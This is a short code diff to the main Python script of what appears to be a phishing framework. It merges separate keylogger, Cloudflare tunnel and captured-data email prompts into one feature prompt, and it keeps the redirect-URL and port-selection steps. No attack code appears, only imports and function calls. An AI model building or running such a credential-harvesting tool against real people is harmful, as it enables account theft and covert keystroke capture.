@@ -13,9 +13,7 @@ from os import system
 import Defs.ActionManager.main_runner as main_runner
 import Defs.ActionManager.Server.server_runner as server_runner
 import Defs.ActionManager.simple_informant as simple_informant
-import Defs.FeatureManager.cloudflare as cloudflare
-import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
-import Defs.FeatureManager.keylogger as keylogger
+import Defs.FeatureManager.feature_prompt as prompt
 
 simple_informant.license_handler()
 agreement = simple_informant.terms_of_service_message()
@@ -39,9 +37,7 @@ simple_informant.check_php()
 if __name__ == "__main__":
     try:
         main_runner.start_main_menu()
-        keylogger.add_keylogger_prompt()
-        cloudflare.add_cloudflare_prompt()
-        email_prompt.captured_data_email_prompt()
+        prompt.feature_prompt()
         main_runner.enter_custom_redirecting_url()
         port = simple_informant.port_selector()
 
